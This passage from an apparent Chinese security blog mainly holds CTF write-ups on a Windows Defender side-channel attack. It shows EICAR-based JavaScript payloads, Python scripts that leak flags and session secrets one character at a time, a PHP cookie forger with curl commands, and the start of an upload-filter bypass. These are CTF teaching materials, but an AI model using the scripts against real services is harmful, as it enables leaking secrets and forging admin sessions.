应用都讲了一遍，或许以后可能还会弄个 TLS Poison 攻击 SMTP 的靶场（应该不太可能），但是 TLS Poison 需要探索的内容依旧还有很多，比如对于显式 FTPS 的 TLS Poison 利用化工具，如果没有了PASV漏洞，FTPS 还有没有其他方式利用等等问题，都是还有待大家进一步去挖掘的。 这些天都花了很多精力在部分研究上，一方面确实我觉得 TLS Poison 是一个很精彩的攻击方式，尽管它局限性很大，但是这个攻击整体构造利用都相对比较巧妙，也是对在众多对 TLS 密码算法的攻击中令人耳目一新；一方面对于 CTF 题目，尤其是 hxp 这个题目我一直耿耿于怀，况且正好这个也是 TLS Poison 的深层次利用，这也成为了后来我整理 TLS Poison 攻击的动力来源之一，并且我也觉得 FTP 真是个非常有意思的协议，而这题预期用到 FTPS 就必须弄懂 TLS Poison ，所以就不得不去把 TLS Poison 弄一遍。没弄之前还以为是比较难的，因为看到好几个选手都重新弄了 DNS 部分，甚至还需要重写一个 DNS Server ，不过对于恶意 TLS 服务这一块确实需要改写 TLS 服务框架才能做。 还有一方面是，我之前发朋友圈探讨 CTF 相关价值观的问题，以及 CTF 是否是信息安全最佳入门方式，@Anciety 评论说 CTF 可能不是信息安全入门方式，但是他认为是信息安全研究的入门方式。正如他所说，通过这个 CTF 题目，我对 TLS Poison 进行了更深入的探究，也有了更多的理解，这可能就是一道良好的 CTF 题目给安全研究者带来的好处之一吧，同时也带给了我很多快乐，也希望以后能遇到更多类似优秀的题目，能引导、推动我去做更多有意思更深层次的研究。","link":"/2021/05/19/tls-ctf/"},{"title":"Windows Defender 侧信道攻击","text":"在今年的 WCTF 2019 上，Tokyo Westerns 出了一道与 Windows Defender 侧信道攻击相关的题目，在 Tokyo Westerns CTF 2019 上也有一道与之有关的题目 PHP Note，看了感觉比较有趣，但是我看的网络文章写的都比较粗略，这里我就记录一下自己的分析。 Windows Defender众所周知，Windows Defender 是 Windows 10 平台上一款自带的安全防护软件，游戏弹窗杀手 Windows Defender（Windows 10 创意者更新后名为Windows Defender Antivirus），曾用名Microsoft AntiSpyware，最初是用来移除、隔离和预防间谍软件的程序，可以运行在Windows XP以及更高版本的操作系统上，并已经内置在Windows Vista以及以后的版本中。Windows Defender的定义库更新很频繁。在Windows 8及之后的系统中取代Microsoft Security Essentials，成为一款全面反病毒软件。 Windows Defender不像某些其他同类免费产品一样只能扫描系统，还可以对系统进行实时监控，移除已经安装的ActiveX插件，清除大多数微软的程序和其他常用程序的历史纪录。 What Windows Defender will do根据 TW 的分析，Windows Defender 会有以下行为： 检查文件内容是否有恶意内容 改变恶意文件的权限以避免用户去加载 替换恶意内容为空 删除整个文件 在第二步中，如果文件被 Windows Defender 检测出是恶意文件的话，用户就不可以访问了。 Make Windows Defender AngryEICAREICAR标准反病毒测试文件，又称EICAR测试文件, 是由欧洲反计算机病毒协会（EICAR）与计算机病毒研究组织（CARO）研制的文件, 用以测试杀毒软件的响应程度。不同于使用可能造成实际破环的实体恶意软件，该文件允许人们在没有计算机病毒的情况下测试杀毒软件。 我们可以使用以下字符串测试 Windows Defender 1X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H* 只需要将这个字符串复制，然后保存在一个空白的 txt 文件当中即可触发 Windwos Defender，所以我们先通过这个样例来检查一下自己的 Windows Defender 是否开启。 Mpengine.dll根据 Tokyo Westerns 的分析，Windows Defender 有一个核心 dll 文件 Mpengine.dll ，他可以对不同的内容进行分析，包括一些 base64 encode/RAR archived/etc. ，其中比较有意思的是它还有一个 Javascript Engine。 这个引擎可以分析 HTML 文档，并且可以分析其中的 Javascript 代码，包括对文档中的 DOM 元素的访问。 我们可以做个简单的验证，我们先只使用以下代码测试： 1var mal = \"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\"; 可以发现我们并没有触发 Windows Defender，即使字符串是 EICAR 测试样本，说明了字符串不受 EICAR 特征影响。 接着我们尝试添加一下eval： 12var mal = \"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\";eval(mal); 没错，在保存的时候就立马触发了 Windows Defender ，足以验证当中有一个 Javascript Engine 进行了内容检测，而且即使没有完整的 Javascript 标签，也可以触发 Windows defender。 Interesting Check接下来我们再看几个测试例子： 1234&lt;script&gt;var mal = \"X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\";eval(mal);&lt;/script&gt; 非常棒，并没有被检测出恶意内容。 接着我们再试着加一个&lt;body&gt;标签: 12345&lt;script&gt;var mal = \"X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\";eval(mal);&lt;/script&gt;&lt;body&gt;&lt;/body&gt; 也很棒，也没有检测出恶意内容。 让我们再操作一下 DOM 元素： 123456&lt;script&gt;var body = document.body.innerHTML;var mal = \"X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\";eval(mal);&lt;/script&gt;&lt;body&gt;&lt;/body&gt; Done! 触发了恶意内容检测。 那如果我们把 EICAR 内容进行一下拆分呢？ 123456&lt;script&gt;var body = document.body.innerHTML;var mal = \"X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H\" + body[0];eval(mal);&lt;/script&gt;&lt;body&gt;a&lt;/body&gt; 这里我们获取的是&lt;body&gt;标签中的第一个字符，也就是a，不构成 EICAR 测试样本，所以触发不了 Windows Defender 也很正常。 那我们改一下&lt;body&gt;标签当中的内容呢？使用*试试看 123456&lt;script&gt;var body = document.body.innerHTML;var mal = \"X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H\" + body[0];eval(mal);&lt;/script&gt;&lt;body&gt;*&lt;/body&gt; 很棒，意料之中地触发了 Windows Defender。 Go Hacking那触发 Windows Defender 会有什么问题吗？虽然这里看似没什么毛病，但是放到业务代码里面就不一样了。 仔细想想一般程序猿会这么写文件呢？细心的程序猿在进行写文件之后要 check 一遍是否写入成功，类似: 123$err = file_put_contents('/tmp/file_name', 'something need to be saved');if(!$err) return Exception; file_put_contents在写入成功后返回写入多少个字节，失败的时候返回False，然后我们就可以利用这个特性，当我们写入恶意数据的时候，因为 Windows Defender 检查出恶意内容，禁止了用户读取权限或者删除了文件，导致服务因为检查写入不成功抛出异常，而对于我们来说可能直接返回错误的状态码类似 500 。 所以我们可以总结一下，大致我们可以有这么一套侧信道攻击的攻击链： 123eval(\"EICA\"+input) -&gt; ? detected -&gt; input is 'R' not detected -&gt; input is not 'R' 如果内容中有&lt;body&gt;标签，并且如果有无法通过正常手段读到的数据，我们可以尝试用这种类似“盲注”的方式去获取秘密数据 123JavaScript can access the elements :)○ if they have &lt;body&gt; tag○ &lt;script&gt;document.body.innerHTML[0]&lt;/script&gt;&lt;body&gt;[secret]&lt;/body&gt; 这里需要注意的是，Tokyo Westerns 指出使用if语句构造的 EICAR 样本，Windows Defender 是不会检测出来的，例如以下 payload ，mal已经可以构造出 EICAR 样本，但是不会触发 Windows Denfender 的，但是大致思路我们可以通过这段代码来理解 12345678&lt;script&gt;var n = 'a';if(document.body.innerHTML[0] &gt; 'a') n = '*';var mal = \"X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H\" + n;eval(mal);&lt;/script&gt;&lt;body&gt;flag{aaa}&lt;/body&gt; 然后我们大致修改一下，不使用if作为判断选择条件，使用Math.min()作为判断选择，所以大致我们可以得到这么个 payload : 1234567&lt;script&gt; var num = 90; var body = document.body.innerHTML[0].charCodeAt(0); var mal = \"X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H\" + {[num] : '*'}[Math.min(num ,body)]; eval(mal);&lt;/script&gt;&lt;body&gt;flag{aaa}&lt;/body&gt; 因为body获取到的是f的 ascii 码为 102 ，大于 90 ，所以Math.min()返回值为 90 ，{[num]:'*'}创建了一个 key 为 90 ，value 为 * 的对象，这里注意需要用[num]把num当作变量，因为如果直接使用{num:'*'}，这样是创建了一个 key 为 num 的一个字符串， value 为 * 的对象 123456789101112131415&gt; var num = 90;undefined&gt; var n = {num : '*'};undefined&gt; console.log([num]);[ 90 ]undefined&gt; console.log(n[num]);undefinedundefined&gt; console.log(n['num']);*undefined&gt; console.log(n);{ num: '*' } 这样我们就可以通过“盲注”的方式获取&lt;body&gt;标签中的秘密数据了。 Gyotaku The Flag题目源码在 Gyotaku The Flag，slides 在 WCTF2019: Gyotaku The Flag 有了以上的知识，让我们回到 WCTF 2019 Gyotaku The Flag 这道题上，这道题有这么几个路由 1234567e.GET(\"/\", IndexHandler(dbconn), LoginRequiredMiddleware)e.GET(\"/gyotaku\", GyotakuListHandler(dbconn), LoginRequiredMiddleware)e.GET(\"/gyotaku/:gid\", GyotakuViewHandler(dbconn), LoginRequiredMiddleware)e.GET(\"/flag\", FlagHandler, InternalRequiredMiddleware)e.POST(\"/login\", LoginHandler(dbconn))e.POST(\"/gyotaku\", GyotakuHandler(dbconn), LoginRequiredMiddleware) So easy to GetFlag在/flag的路由上有一个类似于中间件的功能：InternalRequiredMiddleware 12345678910func InternalRequiredMiddleware(next echo.HandlerFunc) echo.HandlerFunc {truereturn func(c echo.Context) error {truetrueip := net.ParseIP(c.RealIP())truetruelocalip := net.ParseIP(\"127.0.0.1\")truetrueif !ip.Equal(localip) {truetruetruereturn echo.NewHTTPError(http.StatusForbidden)truetrue}truetruereturn next(c)true}} 以及 FlagHandler: 1234567func FlagHandler(c echo.Context) error {truedata, err := ioutil.ReadFile(\"flag\")trueif err != nil {truetruereturn errtrue}truereturn c.String(http.StatusOK, string(data))} 可以看到这是一个控制只能127.0.0.1访问的功能函数，用于构造题目的 SSRF 这么一个类似的关卡，可是由于出题人不是特别细心，echo.Context.RealIP可以被X-Real-IP绕过，所以导致了当时很多人直接通过这个方式拿到了 flag … 题目结束，分析完了，关了吧别看了，后面都是扯淡，拿到 flag 就是王道，管他用什么方式 The better way to GetFlag好了，我们接下来分析分析比较有意思的预期解。 /login路由比较简单，使用的是goleveldb做的数据操作 /gyotaku路由 GET 方法列举用户有多少金坷垃 /gyotaku/:gid从文件中查找gid 我们可以在/gyotaku路由的 POST 方法中看到接收了一个 url 参数，并对 url 进行了请求： 123url := c.FormValue(\"url\")...resp, err := http.Get(url) 这就是我们需要的 SSRF 的点了，传入 url 让服务器请求这个 URL 。 然后我们可以接着往下看，注意到有个写文件的操作： 123456789101112131415161718192021222324252627resp, err := http.Get(url)if err != nil { return err}defer resp.Body.Close()body, err := ioutil.ReadAll(resp.Body)if err != nil { return err}// save gyotakugyotakudata := &amp;GyotakuData{ URL: url, Data: string(body), UserName: username,}buf := bytes.NewBuffer(nil)err = gob.NewEncoder(buf).Encode(gyotakudata)if err != nil { return err}err = ioutil.WriteFile(path.Join(GyotakuDir, gid), buf.Bytes(), 0644)if err != nil { return err} 这段将GyotakuData写入了一个文件当中，并且跟我们上文提到的写文件方法一致，判断了是否写入成功，不成功就返回err，并且在这里三个写入的参数我们都可控。 所以我们现在可以有一个大致思路，通过提交{\"url\":\"http://127.0.0.1/flag\"}到/gyotaku路由，构成一个 SSRF ，这时候/flag路由会返回 flag ，通过以上代码解析，flag 被放到了Data中，接着我们再看一下GyotakuData结构体 12345type GyotakuData struct {trueURL string `json:\"url\"`trueData string `json:\"data\"`trueUserName string `json:\"username\"`} 如果中间是Data是我们&lt;body&gt;标签的 secret 数据，那么UserName我们就需要一个&lt;/body&gt;标签将其闭合，前面 URL 怎么构造好呢？ 因为/flag路由是不处理任何 GET 参数的，所以我们可以尝试把我们需要构造的 payload 放到 URL 参数当中，这样就可以构造了我们上文的 Payload 了，我们需要构造的大致就是以下这样： 12345type GyotakuData struct { URL string \"http://127.0.0.1/flag?&lt;script&gt;var num = 90;var body = document.body.innerHTML[0].charCodeAt(0);var mal = 'X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H' + {[num] : '*'}[Math.min(num ,body)];eval(mal);&lt;/script&gt;&lt;body&gt;\" Data string \"flag{test}\"trueUserName string \"&lt;/body&gt;\"} 这样服务把GyotakuData结构体写入文件当中了: 12...GyotakuData...URL...Data...UserName...http://127.0.0.1/flag?&lt;script&gt;var num = 90;var body = document.body.innerHTML[0].charCodeAt(0);var mal = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H' + {[num] : '*'}[Math.min(num ,body)];eval(mal);&lt;/script&gt;&lt;body&gt;...flag{test}...&lt;/body&gt;... 为了方便阅读，上面我用...代替了不可见字符，可以用以下测试代码进行测试： 12345678910111213141516171819202122232425262728package mainimport (true\"bytes\"true\"encoding/gob\"true\"io/ioutil\")type GyotakuData struct {trueURL string `json:\"url\"`trueData string `json:\"data\"`trueUserName string `json:\"username\"`}func main() {trueurl := \"http://127.0.0.1/flag?&lt;script&gt;var num = 90;var body = document.body.innerHTML[0].charCodeAt(0);var mal = 'X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H' + {[num] : '*'}[Math.min(num ,body)];eval(mal);&lt;/script&gt;&lt;body&gt;\"truebody := \"flag{test}\"trueusername := \"&lt;/body&gt;\"truegyotakudata := &amp;GyotakuData{truetrueURL: url,truetrueData: body,truetrueUserName: username,true}truebuf := bytes.NewBuffer(nil)truegob.NewEncoder(buf).Encode(gyotakudata)trueioutil.WriteFile(\"test.txt\", buf.Bytes(), 0644)} 这样只要我们每次控制 num 的值，我们就可以在服务器 500 的时候判断我们设立的条件是否成立了。这里直接给出 TokyoWesterns 的 exp 脚本，他们使用了二分法加快判断： 123456789101112131415161718192021222324252627282930313233343536import requestsURL = \"http://192.168.122.78\" # changemedef randstr(n=8): import random import string chars = string.ascii_uppercase + string.ascii_lowercase + string.digits return ''.join([random.choice(chars) for _ in range(n)])def trigger(c, idx, sess): import string prefix = randstr() p = prefix + '''&lt;script&gt;f=function(n){eval('X5O!P%@AP[4\\\\\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));&lt;/script&gt;&lt;body&gt;''' p = string.Template(p).substitute({'idx': idx, 'c': c}) req = sess.post(URL + '/gyotaku', data={'url': 'http://127.0.0.1/flag?a=' + p}) return req.json()def leak(idx, sess): l, h = 0, 0x100 while h - l &gt; 1: m = (h + l) // 2 gid = trigger(m, idx, sess) if sess.get(URL + '/gyotaku/' + gid).status_code == 500: l = m else: h = m return chr(l)sess = requests.session()sess.post(URL + '/login', data={'username': '&lt;/body&gt;'+randstr(), 'password': randstr()})data = ''for i in range(30): data += leak(i, sess) print(data) 这里trigger函数中 idx 就是获取的&lt;body&gt;标签中的第几位，c 就是我们传入的用于比较的 ascii 码值。至此，这题就分析完毕了。 PHP Note在 TokyoWesterns CTF 2019 上，由于 WCTF 2019 上的失误，让他们又出了一道与之相关的题目。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181&lt;?phpinclude 'config.php';class Note { public function __construct($admin) { $this-&gt;notes = array(); $this-&gt;isadmin = $admin; } public function addnote($title, $body) { array_push($this-&gt;notes, [$title, $body]); } public function getnotes() { return $this-&gt;notes; } public function getflag() { if ($this-&gt;isadmin === true) { echo FLAG; } }}function verify($data, $hmac) { $secret = $_SESSION['secret']; if (empty($secret)) return false; return hash_equals(hash_hmac('sha256', $data, $secret), $hmac);}function hmac($data) { $secret = $_SESSION['secret']; if (empty($data) || empty($secret)) return false; return hash_hmac('sha256', $data, $secret);}function gen_secret($seed) { return md5(SALT . $seed . PEPPER);}function is_login() { return !empty($_SESSION['secret']);}function redirect($action) { header(\"Location: /?action=$action\"); exit();}$method = $_SERVER['REQUEST_METHOD'];$action = $_GET['action'];if (!in_array($action, ['index', 'login', 'logout', 'post', 'source', 'getflag'])) { redirect('index');}if ($action === 'source') { highlight_file(__FILE__); exit();}session_start();if (is_login()) { $realname = $_SESSION['realname']; $nickname = $_SESSION['nickname']; $note = verify($_COOKIE['note'], $_COOKIE['hmac']) ? unserialize(base64_decode($_COOKIE['note'])) : new Note(false);}if ($action === 'login') { if ($method === 'POST') { $nickname = (string)$_POST['nickname']; $realname = (string)$_POST['realname']; if (empty($realname) || strlen($realname) &lt; 8) { die('invalid name'); } $_SESSION['realname'] = $realname; if (!empty($nickname)) { $_SESSION['nickname'] = $nickname; } $_SESSION['secret'] = gen_secret($nickname); } redirect('index');}if ($action === 'logout') { session_destroy(); redirect('index');}if ($action === 'post') { if ($method === 'POST') { $title = (string)$_POST['title']; $body = (string)$_POST['body']; $note-&gt;addnote($title, $body); $data = base64_encode(serialize($note)); setcookie('note', (string)$data); setcookie('hmac', (string)hmac($data)); } redirect('index');}if ($action === 'getflag') { $note-&gt;getflag();}?&gt;&lt;!doctype html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;PHP note&lt;/title&gt; &lt;/head&gt; &lt;style&gt; textarea { resize: none; width: 300px; height: 200px; } &lt;/style&gt; &lt;body&gt; &lt;?php if (!is_login()) { $realname = htmlspecialchars($realname); $nickname = htmlspecialchars($nickname); ?&gt; &lt;form action=\"/?action=login\" method=\"post\" id=\"login\"&gt; &lt;input type=\"text\" id=\"firstname\" placeholder=\"First Name\"&gt; &lt;input type=\"text\" id=\"lastname\" placeholder=\"Last Name\"&gt; &lt;input type=\"text\" name=\"nickname\" id=\"nickname\" placeholder=\"nickname\"&gt; &lt;input type=\"hidden\" name=\"realname\" id=\"realname\"&gt; &lt;button type=\"submit\"&gt;Login&lt;/button&gt; &lt;/form&gt; &lt;?php } else { ?&gt; &lt;h1&gt;Welcome, &lt;?=$realname?&gt;&lt;?= !empty($nickname) ? \" ($nickname)\" : \"\" ?&gt;&lt;/h1&gt; &lt;a href=\"/?action=logout\"&gt;logout&lt;/a&gt; &lt;!-- &lt;a href=\"/?action=source\"&gt;source&lt;/a&gt; --&gt; &lt;br/&gt; &lt;br/&gt; &lt;?php foreach($note-&gt;getnotes() as $k =&gt; $v) { list($title, $body) = $v; $title = htmlspecialchars($title); $body = htmlspecialchars($body); ?&gt; &lt;h2&gt;&lt;?=$title?&gt;&lt;/h2&gt; &lt;p&gt;&lt;?=$body?&gt;&lt;/p&gt; &lt;?php } ?&gt; &lt;form action=\"/?action=post\" method=\"post\"&gt; &lt;input type=\"text\" name=\"title\" placeholder=\"title\"&gt; &lt;br&gt; &lt;textarea name=\"body\" placeholder=\"body\"&gt;&lt;/textarea&gt; &lt;button type=\"submit\"&gt;Post&lt;/button&gt; &lt;/form&gt; &lt;?php } ?&gt; &lt;?php ?&gt; &lt;script&gt; document.querySelector(\"form#login\").addEventListener('submit', (e) =&gt; { const nickname = document.querySelector(\"input#nickname\") const firstname = document.querySelector(\"input#firstname\") const lastname = document.querySelector(\"input#lastname\") document.querySelector(\"input#realname\").value = `${firstname.value} ${lastname.value}` if (nickname.value.length == 0 &amp;&amp; firstname.value.length &gt; 0 &amp;&amp; lastname.value.length &gt; 0) { nickname.value = firstname.value.toLowerCase()[0] + lastname.value.toLowerCase() } }) &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 乍一看确实没有任何的漏洞点，让人比较在意的只有unserialize函数，我们关注的是getflag()，条件是成为管理员，而我们可以看到有以下条件： 1234567891011function verify($data, $hmac) { $secret = $_SESSION['secret']; if (empty($secret)) return false; return hash_equals(hash_hmac('sha256', $data, $secret), $hmac);}... $note = verify($_COOKIE['note'], $_COOKIE['hmac']) ? unserialize(base64_decode($_COOKIE['note'])) : new Note(false); 如果没有通过verify函数判断，Note的构造函数会设置$this-&gt;isadmin = False;，但是$_SESSION['secret']又由gen_secret函数生成，SALT和PEPPER我们都不知道，用一般的方法拿到 secret 基本不可能。 1234567891011121314151617181920212223function gen_secret($seed) { return md5(SALT . $seed . PEPPER);}...if ($action === 'login') { if ($method === 'POST') { $nickname = (string)$_POST['nickname']; $realname = (string)$_POST['realname']; if (empty($realname) || strlen($realname) &lt; 8) { die('invalid name'); } $_SESSION['realname'] = $realname; if (!empty($nickname)) { $_SESSION['nickname'] = $nickname; } $_SESSION['secret'] = gen_secret($nickname); } redirect('index');} 而hash_equals也没有什么绕过的办法，所以这里看起来似乎没有什么正常的办法。 大致我们可以知道要获取 Flag ，就要成为 admin ，要成为 admin 就要知道 $_SESSION['secret']。 题目的大致功能也比较简单，只有登录注销、增加 post 功能，但是我们可以从相应头发现一些蛛丝马迹： 12Server: Microsoft-IIS/10.0X-Powered-By: PHP/7.3.9 之后我们就可以从这里大概猜到其实与上题一致，为什么这么说呢？ $_SESSION['secret']存放在 Session 文件当中 Session 文件又存放在本地文件系统中 如果 Session 文件含有恶意内容就会被 Windows Defender 阻止访问造成登录失败 这样我们似乎可以通过是否登录成功来获得$_SESSION['secret'] 我们可以本地进行测试一下，随便登录一个发现 session 文件内容是 1realname|s:9:\"zedd zedd\";nickname|s:6:\"yoyoyo\";secret|s:32:\"621e1d6607af0b500603e68b23e042e2\"; 发现 secret 竟然是在我们可控数据的后面，如果没有&lt;/body&gt;标签闭合，Windows Defender 的 JS Engine 不像现代浏览器一样可以闭合标签，这样我们也达不到我们侧信道攻击的效果，所以我们需要找到一个办法让我们可控的地方在 secret 数据后面才行。 让我们再回顾一下登录逻辑 1234567891011121314151617if ($action === 'login') { if ($method === 'POST') { $nickname = (string)$_POST['nickname']; $realname = (string)$_POST['realname']; if (empty($realname) || strlen($realname) &lt; 8) { die('invalid name'); } $_SESSION['realname'] = $realname; if (!empty($nickname)) { $_SESSION['nickname'] = $nickname; } $_SESSION['secret'] = gen_secret($nickname); } redirect('index');} 其中我们可以看到这里有一个$nickname为空的判断，我们看看当$nickname为空的时候登录，session 文件会是怎么样的： 1realname|s:9:\"zedd zedd\";secret|s:32:\"8b9a527ff677cb223afa87dad7c9e6f8\"; 此时如果我们不注销，直接再次发一个含有 nickname 的登录包，看看又会有什么效果 1realname|s:9:\"zedd zedd\";secret|s:32:\"621e1d6607af0b500603e68b23e042e2\";nickname|s:6:\"yoyoyo\"; ！！！这种数据格式不正是我们所需要的侧信道攻击格式吗！这样我们就可以通过 Windows Defender 侧信道攻击把 secret 读出来了！ 只要我们构造类似如下的 payload 就可以了( x 为序列化之后的字符串长度)： 1realname|s:x:\"&lt;script&gt;var body = document.body.innerHTML;var mal = 'X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H;' + body[0];eval(mal);&lt;/script&gt;&lt;body&gt;\";secret|s:32:\"621e1d6607af0b500603e68b23e042e2\";nickname|s:x:\"&lt;/body&gt;\"; 接下来就是与上面类似的步骤，利用“盲注”的形式来读 secret ，下面就贴一下 r3kapig 师傅们的脚本： 123456789101112131415161718192021222324252627282930import requestsURL = \"http://phpnote.chal.ctf.westerns.tokyo\" # changemedef trigger(c, idx): import string p = '''&lt;script&gt;f=function(n){eval('X5O!P%@AP[4\\\\\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));&lt;/script&gt;&lt;body&gt;''' p = string.Template(p).substitute({'idx': idx, 'c': c}) return pdef leak(idx): l, h = 0, 0x100 while h - l &gt; 1: m = (h + l) // 2 gid = trigger(m, idx) # r = requests.post(URL + '/?action=login', data={'realname': gid, 'nickname': '1'}) # print r.content # exit() s = requests.session() s.post(URL + '/?action=login', data={'realname': gid, 'nickname': ''}) if \"/?action=login\" in s.post(URL + '/?action=login', data={'realname': gid, 'nickname': '&lt;/body&gt;'}).content: l = m else: h = m return chr(l)data = ''for i in range(100): data += leak(i) print(data) 拿到 secret 之后，就可以构造 Note 类了： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;?phpclass Note { public function __construct($admin) { $this-&gt;notes = array(); $this-&gt;isadmin = $admin; } public function addnote($title, $body) { array_push($this-&gt;notes, [$title, $body]); } public function getnotes() { return $this-&gt;notes; } public function getflag() { if ($this-&gt;isadmin === true) { echo FLAG; } }}function verify($data, $hmac) { $secret = $_SESSION['secret']; if (empty($secret)) return false; return hash_equals(hash_hmac('sha256', $data, $secret), $hmac);}function hmac($data) { $secret = $_SESSION['secret']; if (empty($data) || empty($secret)) return false; return hash_hmac('sha256', $data, $secret);}function gen_secret($seed) { return \"2532bd172578d19923e5348420e02320\";}// create session$_SESSION = Array();$_SESSION['secret'] = gen_secret('');$_SESSION['realname'] = \"stypr stypr\";$_SESSION['nickname'] = \"\";// generate note$note = new Note(true);$note-&gt;addnote(\"work\", \"work\");$data = base64_encode(serialize($note));/* verify//echo \"Data: \".(string)$data.\"\\n\";//echo \"HMAC: \".(string)hmac($data).\"\\n\";//echo \"-----\";//var_dump(verify((string)$data, (string)hmac($data)));*/?&gt;curl -s 'http://phpnote.chal.ctf.westerns.tokyo/?action=logout' -H 'Cookie: PHPSESSID=468b674d8d6139373a064b832efdf47a;' --insecurecurl -s 'http://phpnote.chal.ctf.westerns.tokyo/?action=login' -H 'Cookie: PHPSESSID=468b674d8d6139373a064b832efdf47a;' --data 'nickname=&lt;/body&gt;&amp;realname=stypr+stypr' --compressed --insecurecurl -s \"http://phpnote.chal.ctf.westerns.tokyo/?action=getflag\" -H \"Cookie: PHPSESSID=468b674d8d6139373a064b832efdf47a; note=&lt;?php echo $data; ?&gt;; hmac=&lt;?php echo hmac($data); ?&gt;;\" 12$ php flag.php | sh | grep \"TWCTF\"TWCTF{h0pefully_I_haven't_made_a_m1stake_again}&lt;!doctype html&gt; One More其实个人觉得 Windows Defender 这个 JS Engine 还是有很多没发掘的地方，奈何自己逆向水平不够，这里放几个会议的分享吧 Windows Offender: Reverse Engineering Windows Defender’s Antivirus Emulator ReferencePlaying with Windwos Defender r3kapig - PHP Note balsn - PHP Note","link":"/2019/09/17/windows-defender/"},{"title":"XNUCA 2019 Qualifier Ezphp","text":"因为 Insomnihack 2019 l33t-hoster 这道题跟 XNUCA 2019 Qualifier Ezphp 如出一辙，比较类似，并且也是比较有意思的一题，所以两个题就放在一起写了 L33T-HOSTER题目在?source直接给出了源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182 &lt;?phpif (isset($_GET[\"source\"])) die(highlight_file(__FILE__));session_start();if (!isset($_SESSION[\"home\"])) { $_SESSION[\"home\"] = bin2hex(random_bytes(20));}$userdir = \"images/{$_SESSION[\"home\"]}/\";if (!file_exists($userdir)) { mkdir($userdir);}$disallowed_ext = array( \"php\", \"php3\", \"php4\", \"php5\", \"php7\", \"pht\", \"phtm\", \"phtml\", \"phar\", \"phps\",);if (isset($_POST[\"upload\"])) { if ($_FILES['image']['error'] !== UPLOAD_ERR_OK) { die(\"yuuuge fail\"); } $tmp_name = $_FILES[\"image\"][\"tmp_name\"]; $name = $_FILES[\"image\"][\"name\"]; $parts = explode(\".\", $name); $ext = array_pop($parts); if (empty($parts[0])) { array_shift($parts); } if (count($parts) === 0) { die(\"lol filename is empty\"); } if (in_array($ext, $disallowed_ext, TRUE)) { die(\"lol nice try, but im not stupid dude...\"); } $image = file_get_contents($tmp_name); if (mb_strpos($image, \"&lt;?\") !== FALSE) { die(\"why would you need php in a pic.....\"); } if (!exif_imagetype($tmp_name)) { die(\"not an image.\"); } $image_size = getimagesize($tmp_name); if ($image_size[0] !== 1337 || $image_size[1] !== 1337) { die(\"lol noob, your pic is not l33t enough\"); } $name = implode(\".\", $parts); move_uploaded_file($tmp_name, $userdir . $name . \".\" . $ext);}echo \"&lt;h3&gt;Your &lt;a href=$userdir&gt;files&lt;/a&gt;:&lt;/h3&gt;&lt;ul&gt;\";foreach(glob($userdir . \"*\") as $file) { echo \"&lt;li&gt;&lt;a href='$file'&gt;$file&lt;/a&gt;&lt;/li&gt;\";}echo \"&lt;/ul&gt;\";?&gt;&lt;h1&gt;Upload your pics!&lt;/h1&gt;&lt;form method=\"POST\" action=\"?\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"file\" name=\"image\"&gt; &lt;input type=\"submit\" name=upload&gt;&lt;/form&gt;&lt;!-- /?source --&gt; XBM.htaccess我们可以发现其实是一个黑名单过滤，然后我们再看一下 http 的响应报文中有这么一个字段： 1Server: Apache/2.4.29 (Ubuntu) 所以我们可以先想到可能可以上传.htaccess，但是如果直接上传.htaccess的话，肯定会被直接 waf 掉 12$parts = explode(\".\", $name);$ext = array_pop($parts); explode会将$name以.分割成数组 123456array(2) { [0]=&gt; string(0) \"\" [1]=&gt; string(8) \"htaccess\"} array_pop会把$parts数组最后一个元素取出，并将长度减一。所以如果直接上传.htaccess，得到的后缀将是htaccess，得到 1234array(2) { [0]=&gt; string(0) \"\"} 接着两个判断，第一个判断$parts[0]是否为空，为空就将$parts[0]移除数组，第二个判断$parts长度是否为 0 ，第三个判断$ext是否在黑名单里面 1234567891011if (empty($parts[0])) { array_shift($parts);}if (count($parts) === 0) { die(\"lol filename is empty\");}if (in_array($ext, 